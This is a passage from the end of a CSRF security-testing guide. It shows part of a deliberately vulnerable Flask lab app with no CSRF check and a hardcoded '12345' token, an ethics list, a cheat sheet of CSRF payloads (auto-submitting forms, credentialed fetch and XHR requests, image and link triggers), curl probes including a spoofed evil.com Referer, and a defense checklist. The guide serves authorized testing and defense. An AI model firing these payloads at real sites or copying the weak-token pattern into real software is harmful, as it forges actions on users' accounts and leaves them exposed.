    return f"Email changed to: {email} (No CSRF protection!)"

@app.route("/change-email-weak", methods=["POST"])
def change_email_weak():
    token = request.form.get("csrf_token")
    if token == "12345":  # Weak, predictable token
        email = request.form.get("email")
        return f"Email changed to: {email} (Weak token)"
    return "Invalid token", 403

@app.route("/change-email-strong", methods=["POST"])
def change_email_strong():
    # Would need proper CSRF validation
    return "Email changed (Strong token)"

def csrf_token():
    return session.get('csrf_token', 'not_set')

if __name__ == "__main__":
    app.run(port=5004, debug=True)
```

## Ethics

- **Authorization**: Only test CSRF on systems with explicit written permission
- **No Account Takeover**: Do not actually change victim accounts during testing
- **PoC Demonstration**: Use benign actions (change display name, not password) for CSRF PoCs
- **Responsible Disclosure**: Report CSRF vulnerabilities privately with remediation guidance
- **Impact Communication**: Clearly explain CSRF business impact to stakeholders
- **No Social Engineering**: Do not social-engineer users into triggering CSRF PoCs
- **Legal Awareness**: Unauthorized CSRF testing may violate computer fraud laws
- **Testing Scope**: Stay within authorized scope; do not test unauthorized systems
- **Clean State**: Ensure testing does not leave persistent changes
- **Documentation**: Document all CSRF tests and findings for remediation

## Quick Reference

### CSRF Payload Cheat Sheet

```html
<!-- Auto-submitting form -->
<form action="https://target.com/action" method="POST">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF via fetch -->
<script>
fetch("https://target.com/api/action", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({param1: "value1"})
});
</script>

<!-- Image tag CSRF (GET-based) -->
<img src="https://target.com/action?param=value">

<!-- Link-based CSRF -->
<a href="https://target.com/action?param=value" style="display:none">Click</a>
<script>document.querySelector('a').click();</script>

<!-- XMLHttpRequest CSRF -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/action", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("param1=value1");
</script>

<!-- Multipart CSRF -->
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit">
</form>
```

### Quick Detection Commands

```bash
# Test CSRF without token
curl -X POST -d "email=test@test.com" https://target.com/change-email

# Test with different Content-Type
curl -X POST -H "Content-Type: text/plain" -d '{"email":"test@test.com"}' https://target.com/api/email

# Analyze cookies
curl -sI https://target.com | grep -i "set-cookie"

# Test SameSite behavior
curl -sI https://target.com | grep -i "samesite"

# Test with Referer
curl -X POST -H "Referer: https://evil.com" -d "email=test@test.com" https://target.com/change-email
```

### Defense Checklist

```
☐ Anti-CSRF tokens on all state-changing endpoints
☐ SameSite=Strict or Lax on session cookies
☐ Content-Type validation for API endpoints
☐ Custom headers (X-Requested-With) for AJAX requests
☐ Referrer/Origin validation as defense-in-depth
☐ Re-authentication for sensitive operations (password, email, payment)
☐ Token bound to specific user session
☐ Token regenerated after login/privilege change
☐ No GET requests for state-changing operations
☐ Login form CSRF protection
☐ Rate limiting on state-changing endpoints
```

---

**Last Updated**: 2026
**Author**: Advanced Automation Security Framework
**Version**: 2.0
**Tags**: #csrf #samesite #anti-csrf #token-bypass #form-based #json-csrf #automation
